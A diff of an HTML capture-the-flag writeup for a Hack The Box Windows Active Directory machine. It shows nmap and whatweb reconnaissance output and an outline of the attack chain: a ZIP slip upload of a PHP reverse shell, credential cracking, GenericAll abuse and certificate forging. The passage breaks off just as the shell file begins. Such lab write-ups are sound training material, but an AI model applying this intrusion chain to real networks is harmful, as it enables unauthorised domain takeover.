@@ -3,420 +3,128 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Certificate Writeup — Hackthekat</title>
   <meta name="description" content="HTB Certificate machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      certificate
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>certificate</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
       <h1>Hack The Box: <span class="accent">Certificate</span></h1>
       <div class="writeup-badges">
         <span class="htb-badge os-windows">Windows</span>
-        <span class="htb-badge diff-medium">Hard</span>
+        <span class="htb-badge diff-hard">Hard</span>
       </div>
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Certificate</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-hard">Hard</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Certificate is a Hard difficulty Windows Active Directory machine featuring a web-based learning platform with a file upload vulnerability. Through a <strong>ZIP slip technique</strong>, a PHP reverse shell is uploaded to gain initial access. Credentials are extracted from a MySQL database and cracked, enabling WinRM access. BloodHound reveals <strong>GenericAll</strong> rights over domain users, which are abused to change passwords and pivot through multiple accounts. The final escalation uses <strong>SeManageVolumePrivilege</strong> and <strong>certipy-ad</strong> to forge a certificate as Administrator and obtain the domain hash.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607162037.png" alt="Pasted image 20250607162037.png" loading="lazy" /><span class="img-caption">Pasted image 20250607162037.png</span></div>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
-      <div class="code-block"><pre><code>nmap 10.129.251.88 
+      <p>I start with a full port scan to discover all open services.</p>
+      <div class="code-block"><pre><code>nmap 10.129.251.88                                                          
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 20:31 CEST
 Nmap scan report for 10.129.251.88
 Host is up (0.016s latency).
 Not shown: 987 filtered tcp ports (no-response)
-PORT STATE SERVICE
-53/tcp open domain
-80/tcp open http
-88/tcp open kerberos-sec
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-5985/tcp open wsman
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
 
 Nmap done: 1 IP address (1 host up) scanned in 4.44 seconds</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+      <p>A detailed service scan reveals web (HTTP/80), typical AD ports, and WinRM (5985).</p>
       <div class="code-block"><pre><code>nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV 10.129.251.88 -vvvv
 Scanned at 2025-06-01 20:35:37 CEST for 86s
 
-PORT STATE SERVICE REASON VERSION
-53/tcp open domain syn-ack ttl 127 Simple DNS Plus
-80/tcp open http syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
+80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
 |_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
 |_http-favicon: Unknown favicon MD5: FBA180716B304B231C4029637CCF6481
 | http-methods: 
-|_ Supported Methods: GET HEAD POST OPTIONS
+|_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Certificate | Your portal for certification
-88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-01 20:43:55Z)
-135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-01 20:43:55Z)
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-06-01T20:45:24+00:00; +2h08m21s from scanner time.
 | ssl-cert: Subject: commonName=DC01.certificate.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb
@@ -425,16 +133,16 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-04T03:14:54
-| Not valid after: 2025-11-04T03:14:54
-| MD5: 0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
+| Not valid after:  2025-11-04T03:14:54
+| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
 | SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
 | -----BEGIN CERTIFICATE-----
 | //
 |_-----END CERTIFICATE-----
-445/tcp open microsoft-ds? syn-ack ttl 127
-464/tcp open kpasswd5? syn-ack ttl 127
-593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=DC01.certificate.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb
 | Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
@@ -442,14 +150,14 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-04T03:14:54
-| Not valid after: 2025-11-04T03:14:54
-| MD5: 0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
+| Not valid after:  2025-11-04T03:14:54
+| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
 | SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
 | -----BEGIN CERTIFICATE-----
 | //
 |_-----END CERTIFICATE-----
 |_ssl-date: 2025-06-01T20:45:24+00:00; +2h08m21s from scanner time.
-3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-06-01T20:45:24+00:00; +2h08m21s from scanner time.
 | ssl-cert: Subject: commonName=DC01.certificate.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb
@@ -458,13 +166,13 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-04T03:14:54
-| Not valid after: 2025-11-04T03:14:54
-| MD5: 0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
+| Not valid after:  2025-11-04T03:14:54
+| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
 | SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
 | -----BEGIN CERTIFICATE-----
 |//
 |_-----END CERTIFICATE-----
-3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
+3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-06-01T20:45:24+00:00; +2h08m21s from scanner time.
 | ssl-cert: Subject: commonName=DC01.certificate.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certificate.htb
@@ -473,13 +181,13 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2024-11-04T03:14:54
-| Not valid after: 2025-11-04T03:14:54
-| MD5: 0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
+| Not valid after:  2025-11-04T03:14:54
+| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
 | SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
 | -----BEGIN CERTIFICATE-----
 | //
 |_-----END CERTIFICATE-----
-5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
@@ -497,222 +205,150 @@ Completed NSE at 20:37, 0.00s elapsed
 Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 86.85 seconds
- Raw packets sent: 17 (724B) | Rcvd: 14 (600B)</code></pre></div>
-      <p>As you can see, we have not received any further information about user credentials. As you can see above, port 80 is open. So I have now navigated to the web page.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250601145436.png" alt="Pasted image 20250601145436.png" loading="lazy" /><span class="img-caption">Pasted image 20250601145436.png</span></div>
-      <p>I decided to check which version the web server is running on. You can do this by using the following command.</p>
-      <div class="code-block"><pre><code>whatweb http://certificate.htb
-http://certificate.htb [200 OK] Apache[2.4.58], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30], HttpOnly[PHPSESSID], IP[10.129.251.88], JQuery[2.2.4], Meta-Author[colorlib], OpenSSL[3.1.3], PHP[8.0.30], Script[text/javascript], Title[Certificate | Your portal for certification], X-Powered-By[PHP/8.0.30]</code></pre></div>
-      <p>If you browse around the website a little, you will see that you can register an account. So, the first thing I did was create my own account.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250601153402.png" alt="Pasted image 20250601153402.png" loading="lazy" /><span class="img-caption">Pasted image 20250601153402.png</span></div>
-      <p>Once you are logged in, you can view the courses that are available. When you click on a course, you will be taken to the next page.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250601153624.png" alt="Pasted image 20250601153624.png" loading="lazy" /><span class="img-caption">Pasted image 20250601153624.png</span></div>
-      <p>At the bottom of the page, you will find the Course Outline where you can upload the quiz answers, but in reality, we are going to upload a malicious file. Before we can see the Course Outline, we will first have to enroll in the course. You can do this by clicking on the enroll button.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250601162607.png" alt="Pasted image 20250601162607.png" loading="lazy" /><span class="img-caption">Pasted image 20250601162607.png</span></div>
-      <p>First, I tested creating an evil_php file and uploading it. I created the evil file by placing the following code in a .php file. The code I used is code that I had used before in another box, but I changed the IP address to that of my machine at that moment.</p>
+           Raw packets sent: 17 (724B) | Rcvd: 14 (600B)</code></pre></div>
+      <h2 class="writeup-section-title">Foothold: ZIP Slip Upload</h2>
+      <h3 class="writeup-sub-title">Web Application Exploration</h3>
+      <p>Port 80 hosts a learning platform. After registration and login, course pages allow uploading quiz answers as ZIP files.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250601145436.png" alt="Learning platform login page" loading="lazy" /><span class="img-caption">Learning platform login page</span></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250601153402.png" alt="Course page with quiz upload functionality" loading="lazy" /><span class="img-caption">Course page with quiz upload functionality</span></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250601153624.png" alt="Upload form that accepts ZIP files" loading="lazy" /><span class="img-caption">Upload form that accepts ZIP files</span></div>
+      <h3 class="writeup-sub-title">Crafting the Malicious Upload</h3>
+      <p>I create a PHP reverse shell using a simple RCE payload that connects back to my listener.</p>
       <div class="code-block"><pre><code>nano shell.php
 
 &lt;?php
